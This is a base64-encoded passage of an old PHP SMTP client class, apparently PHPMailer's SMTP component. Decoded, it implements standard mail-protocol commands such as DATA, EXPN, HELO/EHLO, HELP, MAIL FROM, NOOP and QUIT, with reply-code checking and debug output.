ICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgICMgdGhlIHNlcnZlciBpcyByZWFkeSB0byBhY2NlcHQgZGF0YSEKICAgICMgYWNjb3JkaW5nIHRvIHJmYyA4MjEgd2Ugc2hvdWxkIG5vdCBzZW5kIG1vcmUgdGhhbiAxMDAwCiAgICAjIGluY2x1ZGluZyB0aGUgQ1JMRgogICAgIyBjaGFyYWN0ZXJzIG9uIGEgc2luZ2xlIGxpbmUgc28gd2Ugd2lsbCBicmVhayB0aGUgZGF0YSB1cAogICAgIyBpbnRvIGxpbmVzIGJ5IFxyIGFuZC9vciBcbiB0aGVuIGlmIG5lZWRlZCB3ZSB3aWxsIGJyZWFrCiAgICAjIGVhY2ggb2YgdGhvc2UgaW50byBzbWFsbGVyIGxpbmVzIHRvIGZpdCB3aXRoaW4gdGhlIGxpbWl0LgogICAgIyBpbiBhZGRpdGlvbiB3ZSB3aWxsIGJlIGxvb2tpbmcgZm9yIGxpbmVzIHRoYXQgc3RhcnQgd2l0aAogICAgIyBhIHBlcmlvZCAnLicgYW5kIGFwcGVuZCBhbmQgYWRkaXRpb25hbCBwZXJpb2QgJy4nIHRvIHRoYXQKICAgICMgbGluZS4gTk9URTogdGhpcyBkb2VzIG5vdCBjb3VudCB0b3dhcmRzIGFyZSBsaW1pdC4KCiAgICAjIG5vcm1hbGl6ZSB0aGUgbGluZSBicmVha3Mgc28gd2Uga25vdyB0aGUgZXhwbG9kZSB3b3JrcwogICAgJG1zZ19kYXRhID0gc3RyX3JlcGxhY2UoIlxyXG4iLCJcbiIsJG1zZ19kYXRhKTsKICAgICRtc2dfZGF0YSA9IHN0cl9yZXBsYWNlKCJcciIsIlxuIiwkbXNnX2RhdGEpOwogICAgJGxpbmVzID0gZXhwbG9kZSgiXG4iLCRtc2dfZGF0YSk7CgogICAgIyB3ZSBuZWVkIHRvIGZpbmQgYSBnb29kIHdheSB0byBkZXRlcm1pbmUgaXMgaGVhZGVycyBhcmUKICAgICMgaW4gdGhlIG1zZ19kYXRhIG9yIGlmIGl0IGlzIGEgc3RyYWlnaHQgbXNnIGJvZHkKICAgICMgY3VycmVudGx5IEkgYW0gYXNzdW1pbmcgcmZjIDgyMiBkZWZpbml0aW9ucyBvZiBtc2cgaGVhZGVycwogICAgIyBhbmQgaWYgdGhlIGZpcnN0IGZpZWxkIG9mIHRoZSBmaXJzdCBsaW5lICgnOicgc3BlcmF0ZWQpCiAgICAjIGRvZXMgbm90IGNvbnRhaW4gYSBzcGFjZSB0aGVuIGl0IF9zaG91bGRfIGJlIGEgaGVhZGVyCiAgICAjIGFuZCB3ZSBjYW4gcHJvY2VzcyBhbGwgbGluZXMgYmVmb3JlIGEgYmxhbmsgIiIgbGluZSBhcwogICAgIyBoZWFkZXJzLgogICAgJGZpZWxkID0gc3Vic3RyKCRsaW5lc1swXSwwLHN0cnBvcygkbGluZXNbMF0sIjoiKSk7CiAgICAkaW5faGVhZGVycyA9IGZhbHNlOwogICAgaWYoIWVtcHR5KCRmaWVsZCkgJiYgIXN0cnN0cigkZmllbGQsIiAiKSkgewogICAgICAkaW5faGVhZGVycyA9IHRydWU7CiAgICB9CgogICAgJG1heF9saW5lX2xlbmd0aCA9IDk5ODsgIyB1c2VkIGJlbG93OyBzZXQgaGVyZSBmb3IgZWFzZSBpbiBjaGFuZ2UKCiAgICB3aGlsZShsaXN0KCwkbGluZSkgPSBAZWFjaCgkbGluZXMpKSB7CiAgICAgICRsaW5lc19vdXQgPSBudWxsOwogICAgICBpZigkbGluZSA9PSAiIiAmJiAkaW5faGVhZGVycykgewogICAgICAgICRpbl9oZWFkZXJzID0gZmFsc2U7CiAgICAgIH0KICAgICAgIyBvayB3ZSBuZWVkIHRvIGJyZWFrIHRoaXMgbGluZSB1cCBpbnRvIHNldmVyYWwKICAgICAgIyBzbWFsbGVyIGxpbmVzCiAgICAgIHdoaWxlKHN0cmxlbigkbGluZSkgPiAkbWF4X2xpbmVfbGVuZ3RoKSB7CiAgICAgICAgJHBvcyA9IHN0cnJwb3Moc3Vic3RyKCRsaW5lLDAsJG1heF9saW5lX2xlbmd0aCksIiAiKTsKCiAgICAgICAgIyBQYXRjaCB0byBmaXggRE9TIGF0dGFjawogICAgICAgIGlmKCEkcG9zKSB7CiAgICAgICAgICAkcG9zID0gJG1heF9saW5lX2xlbmd0aCAtIDE7CiAgICAgICAgfQoKICAgICAgICAkbGluZXNfb3V0W10gPSBzdWJzdHIoJGxpbmUsMCwkcG9zKTsKICAgICAgICAkbGluZSA9IHN1YnN0cigkbGluZSwkcG9zICsgMSk7CiAgICAgICAgIyBpZiB3ZSBhcmUgcHJvY2Vzc2luZyBoZWFkZXJzIHdlIG5lZWQgdG8KICAgICAgICAjIGFkZCBhIExXU1AtY2hhciB0byB0aGUgZnJvbnQgb2YgdGhlIG5ldyBsaW5lCiAgICAgICAgIyByZmMgODIyIG9uIGxvbmcgbXNnIGhlYWRlcnMKICAgICAgICBpZigkaW5faGVhZGVycykgewogICAgICAgICAgJGxpbmUgPSAiXHQiIC4gJGxpbmU7CiAgICAgICAgfQogICAgICB9CiAgICAgICRsaW5lc19vdXRbXSA9ICRsaW5lOwoKICAgICAgIyBub3cgc2VuZCB0aGUgbGluZXMgdG8gdGhlIHNlcnZlcgogICAgICB3aGlsZShsaXN0KCwkbGluZV9vdXQpID0gQGVhY2goJGxpbmVzX291dCkpIHsKICAgICAgICBpZihzdHJsZW4oJGxpbmVfb3V0KSA+IDApCiAgICAgICAgewogICAgICAgICAgaWYoc3Vic3RyKCRsaW5lX291dCwgMCwgMSkgPT0gIi4iKSB7CiAgICAgICAgICAgICRsaW5lX291dCA9ICIuIiAuICRsaW5lX291dDsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwkbGluZV9vdXQgLiAkdGhpcy0+Q1JMRik7CiAgICAgIH0KICAgIH0KCiAgICAjIG9rIGFsbCB0aGUgbWVzc2FnZSBkYXRhIGhhcyBiZWVuIHNlbnQgc28gbGV0cyBnZXQgdGhpcwogICAgIyBvdmVyIHdpdGggYWxlYWR5CiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCAkdGhpcy0+Q1JMRiAuICIuIiAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAyNTApIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJEQVRBIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIHJldHVybiB0cnVlOwogIH0KCiAgLyoqCiAgICogRXhwYW5kIHRha2VzIHRoZSBuYW1lIGFuZCBhc2tzIHRoZSBzZXJ2ZXIgdG8gbGlzdCBhbGwgdGhlCiAgICogcGVvcGxlIHdobyBhcmUgbWVtYmVycyBvZiB0aGUgX2xpc3RfLiBFeHBhbmQgd2lsbCByZXR1cm4KICAgKiBiYWNrIGFuZCBhcnJheSBvZiB0aGUgcmVzdWx0IG9yIGZhbHNlIGlmIGFuIGVycm9yIG9jY3Vycy4KICAgKiBFYWNoIHZhbHVlIGluIHRoZSBhcnJheSByZXR1cm5lZCBoYXMgdGhlIGZvcm1hdCBvZjoKICAgKiAgICAgWyA8ZnVsbC1uYW1lPiA8c3A+IF0gPHBhdGg+CiAgICogVGhlIGRlZmluaXRpb24gb2YgPHBhdGg+IGlzIGRlZmluZWQgaW4gcmZjIDgyMQogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBFWFBOIDxTUD4gPHN0cmluZz4gPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwCiAgICogU01UUCBDT0RFIEZBSUxVUkU6IDU1MAogICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAsNTAxLDUwMiw1MDQsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIHN0cmluZyBhcnJheQogICAqLwogIGZ1bmN0aW9uIEV4cGFuZCgkbmFtZSkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICAgImVycm9yIiA9PiAiQ2FsbGVkIEV4cGFuZCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCJFWFBOICIgLiAkbmFtZSAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAyNTApIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJFWFBOIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAjIHBhcnNlIHRoZSByZXBseSBhbmQgcGxhY2UgaW4gb3VyIGFycmF5IHRvIHJldHVybiB0byB1c2VyCiAgICAkZW50cmllcyA9IGV4cGxvZGUoJHRoaXMtPkNSTEYsJHJwbHkpOwogICAgd2hpbGUobGlzdCgsJGwpID0gQGVhY2goJGVudHJpZXMpKSB7CiAgICAgICRsaXN0W10gPSBzdWJzdHIoJGwsNCk7CiAgICB9CgogICAgcmV0dXJuICRsaXN0OwogIH0KCiAgLyoqCiAgICogU2VuZHMgdGhlIEhFTE8gY29tbWFuZCB0byB0aGUgc210cCBzZXJ2ZXIuCiAgICogVGhpcyBtYWtlcyBzdXJlIHRoYXQgd2UgYW5kIHRoZSBzZXJ2ZXIgYXJlIGluCiAgICogdGhlIHNhbWUga25vd24gc3RhdGUuCiAgICoKICAgKiBJbXBsZW1lbnRzIGZyb20gcmZjIDgyMTogSEVMTyA8U1A+IDxkb21haW4+IDxDUkxGPgogICAqCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAogICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAsIDUwMSwgNTA0LCA0MjEKICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIEhlbGxvKCRob3N0PSIiKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KAogICAgICAgICAgICAiZXJyb3IiID0+ICJDYWxsZWQgSGVsbG8oKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgIyBpZiBhIGhvc3RuYW1lIGZvciB0aGUgSEVMTyB3YXMgbm90IHNwZWNpZmllZCBkZXRlcm1pbmUKICAgICMgYSBzdWl0YWJsZSBvbmUgdG8gc2VuZAogICAgaWYoZW1wdHkoJGhvc3QpKSB7CiAgICAgICMgd2UgbmVlZCB0byBkZXRlcm1pbmUgc29tZSBzb3J0IG9mIGFwcG9waWF0ZSBkZWZhdWx0CiAgICAgICMgdG8gc2VuZCB0byB0aGUgc2VydmVyCiAgICAgICRob3N0ID0gImxvY2FsaG9zdCI7CiAgICB9CgogICAgLy8gU2VuZCBleHRlbmRlZCBoZWxsbyBmaXJzdCAoUkZDIDI4MjEpCiAgICBpZighJHRoaXMtPlNlbmRIZWxsbygiRUhMTyIsICRob3N0KSkKICAgIHsKICAgICAgaWYoISR0aGlzLT5TZW5kSGVsbG8oIkhFTE8iLCAkaG9zdCkpCiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTZW5kcyBhIEhFTE8vRUhMTyBjb21tYW5kLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIFNlbmRIZWxsbygkaGVsbG8sICRob3N0KSB7CiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCAkaGVsbG8gLiAiICIgLiAkaG9zdCAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjogIiAuICR0aGlzLT5DUkxGIC4gJHJwbHk7CiAgICB9CgogICAgaWYoJGNvZGUgIT0gMjUwKSB7CiAgICAgICR0aGlzLT5lcnJvciA9CiAgICAgICAgYXJyYXkoImVycm9yIiA9PiAkaGVsbG8gLiAiIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAkdGhpcy0+aGVsb19ycGx5ID0gJHJwbHk7CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBHZXRzIGhlbHAgaW5mb3JtYXRpb24gb24gdGhlIGtleXdvcmQgc3BlY2lmaWVkLiBJZiB0aGUga2V5d29yZAogICAqIGlzIG5vdCBzcGVjaWZpZWQgdGhlbiByZXR1cm5zIGdlbmVyaWMgaGVscCwgdXNzdWFsbHkgY29udGlhbmluZwogICAqIEEgbGlzdCBvZiBrZXl3b3JkcyB0aGF0IGhlbHAgaXMgYXZhaWxhYmxlIG9uLiBUaGlzIGZ1bmN0aW9uCiAgICogcmV0dXJucyB0aGUgcmVzdWx0cyBiYWNrIHRvIHRoZSB1c2VyLiBJdCBpcyB1cCB0byB0aGUgdXNlciB0bwogICAqIGhhbmRsZSB0aGUgcmV0dXJuZWQgZGF0YS4gSWYgYW4gZXJyb3Igb2NjdXJzIHRoZW4gZmFsc2UgaXMKICAgKiByZXR1cm5lZCB3aXRoICR0aGlzLT5lcnJvciBzZXQgYXBwcm9waWF0ZWx5LgogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBIRUxQIFsgPFNQPiA8c3RyaW5nPiBdIDxDUkxGPgogICAqCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDIxMSwyMTQKICAgKiBTTVRQIENPREUgRVJST1IgIDogNTAwLDUwMSw1MDIsNTA0LDQyMQogICAqIEBhY2Nlc3MgcHVibGljCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBIZWxwKCRrZXl3b3JkPSIiKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHRvIGF2b2lkIGNvbmZ1c2lvbgoKICAgIGlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKICAgICAgJHRoaXMtPmVycm9yID0gYXJyYXkoCiAgICAgICAgICAgICAgImVycm9yIiA9PiAiQ2FsbGVkIEhlbHAoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJGV4dHJhID0gIiI7CiAgICBpZighZW1wdHkoJGtleXdvcmQpKSB7CiAgICAgICRleHRyYSA9ICIgIiAuICRrZXl3b3JkOwogICAgfQoKICAgIGZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sIkhFTFAiIC4gJGV4dHJhIC4gJHRoaXMtPkNSTEYpOwoKICAgICRycGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJGNvZGUgPSBzdWJzdHIoJHJwbHksMCwzKTsKCiAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMikgewogICAgICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICRycGx5OwogICAgfQoKICAgIGlmKCRjb2RlICE9IDIxMSAmJiAkY29kZSAhPSAyMTQpIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJIRUxQIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICByZXR1cm4gJHJwbHk7CiAgfQoKICAvKioKICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluCiAgICogJGZyb20uIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAqIHRoZSBtYWlsIHRyYW5zYWN0aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgUmVjaXBpZW50CiAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4KICAgKgogICAqIEltcGxlbWVudHMgcmZjIDgyMTogTUFJTCA8U1A+IEZST006PHJldmVyc2UtcGF0aD4gPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDU1Miw0NTEsNDUyCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDUwMCw1MDEsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBNYWlsKCRmcm9tKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KAogICAgICAgICAgICAgICJlcnJvciIgPT4gIkNhbGxlZCBNYWlsKCkgd2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgICR1c2VWZXJwID0gKCR0aGlzLT5kb192ZXJwID8gIlhWRVJQIiA6ICIiKTsKICAgIGZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sIk1BSUwgRlJPTTo8IiAuICRmcm9tIC4gIj4iIC4gJHVzZVZlcnAgLiAkdGhpcy0+Q1JMRik7CgogICAgJHJwbHkgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CiAgICAkY29kZSA9IHN1YnN0cigkcnBseSwwLDMpOwoKICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CiAgICAgIGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHJwbHk7CiAgICB9CgogICAgaWYoJGNvZGUgIT0gMjUwKSB7CiAgICAgICR0aGlzLT5lcnJvciA9CiAgICAgICAgYXJyYXkoImVycm9yIiA9PiAiTUFJTCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2ZXIiLAogICAgICAgICAgICAgICJzbXRwX2NvZGUiID0+ICRjb2RlLAogICAgICAgICAgICAgICJzbXRwX21zZyIgPT4gc3Vic3RyKCRycGx5LDQpKTsKICAgICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKICAgICAgICBlY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KICAgICAgICAgICAgICAgICAiOiAiIC4gJHJwbHkgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIC8qKgogICAqIFNlbmRzIHRoZSBjb21tYW5kIE5PT1AgdG8gdGhlIFNNVFAgc2VydmVyLgogICAqCiAgICogSW1wbGVtZW50cyBmcm9tIHJmYyA4MjE6IE5PT1AgPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwCiAgICogU01UUCBDT0RFIEVSUk9SICA6IDUwMCwgNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBOb29wKCkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICAgICAiZXJyb3IiID0+ICJDYWxsZWQgTm9vcCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCJOT09QIiAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAyNTApIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJOT09QIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIHJldHVybiB0cnVlOwogIH0KCiAgLyoqCiAgICogU2VuZHMgdGhlIHF1aXQgY29tbWFuZCB0byB0aGUgc2VydmVyIGFuZCB0aGVuIGNsb3NlcyB0aGUgc29ja2V0CiAgICogaWYgdGhlcmUgaXMgbm8gZXJyb3Igb3IgdGhlICRjbG9zZV9vbl9lcnJvciBhcmd1bWVudCBpcyB0cnVlLgogICAqCiAgICogSW1wbGVtZW50cyBmcm9tIHJmYyA4MjE6IFFVSVQgPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjIxCiAgICogU01UUCBDT0RFIEVSUk9SICA6IDUwMAogICAqIEBhY2Nlc3MgcHVibGljCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gUXVpdCgkY2xvc2Vfb25fZXJyb3I9dHJ1ZSkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyB0aGVyZSBpcyBubyBjb25mdXNpb24KCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KAogICAgICAgICAgICAgICJlcnJvciIgPT4gIkNhbGxlZCBRdWl0KCkgd2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgICMgc2VuZCB0aGUgcXVpdCBjb21tYW5kIHRvIHRoZSBzZXJ2ZXIKICAgIGZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sInF1aXQiIC4gJHRoaXMtPkNSTEYpOwoKICAgICMgZ2V0IGFueSBnb29kLWJ5ZSBtZXNzYWdlcwogICAgJGJ5ZW1zZyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCiAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMikgewogICAgICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICRieWVtc2c7CiAgICB9CgogICAgJHJ2YWwgPSB0cnVlOwogICAgJGUgPSBudWxsOwoKICAgICRjb2RlID0gc3Vic3RyKCRieWVtc2csMCwzKTsKICAgIGlmKCRjb2RlICE9IDIyMSkgewogICAgICAjIHVzZSBlIGFzIGEgdG1wIHZhciBjYXVzZSBDbG9zZSB3aWxsIG92ZXJ3cml0ZSAkdGhpcy0+ZXJyb3IKICAgICAgJGUgPSBhcnJheSgiZXJyb3IiID0+ICJTTVRQIHNlcnZlciByZWplY3RlZCBxdWl0IGNvbW1hbmQiLAogICAgICAgICAgICAgICAgICJzbXRwX2NvZGUiID0+ICRjb2RlLAogICAgICAgICAgICAgICAgICJzbXRwX3JwbHkiID0+IHN1YnN0cigkYnllbXNnLDQpKTsKICAgICAgJHJ2YWwgPSBmYWxzZTsKICAgICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKICAgICAgICBlY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJGVbImVycm9yIl0gLiAiOiAiIC4KICAgICAgICAgICAgICAgICAkYnllbXNnIC4gJHRoaXMtPkNSTEY7CiAgICAgIH0KICAgIH0KCiAgICBpZihlbXB0eSgkZSkgfHwgJGNsb3NlX29uX2Vycm9yKSB7CiAgICAgICR0aGlzLT5DbG9zZSgpOwogICAgfQoKICAgIHJldHVybiAkcnZhbDsKICB9CgogIC8qKgogICAqIFNlbmRzIHRoZSBjb21tYW5kIFJDUFQgdG8gdGhlIFNNVFAgc2VydmVyIHdpdGggdGhlIFRPOiBhcmd1bWVudCBvZiAkdG8uCiAgICogUmV0dXJucyB0cnVlIGlmIHRoZSByZWNpcGllbnQgd2FzIGFjY2VwdGVkIGZhbHNlIGlmIGl0IHdhcyByZWplY3RlZC4KICAgKgogICAqIEltcGxlbWVudHMgZnJvbSByZmMgODIxOiBSQ1BUIDxTUD4gVE86PGZvcndhcmQtcGF0aD4gPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwLDI1MQogICAqIFNNVFAgQ09ERSBGQUlMVVJFOiA1NTAsNTUxLDU1Miw1NTMsNDUwLDQ1MSw0NTIKICAgKiBTTVRQIENPREUgRVJST1IgIDogNTAwLDUwMSw1MDMsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBSZWNpcGllbnQoJHRvKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGF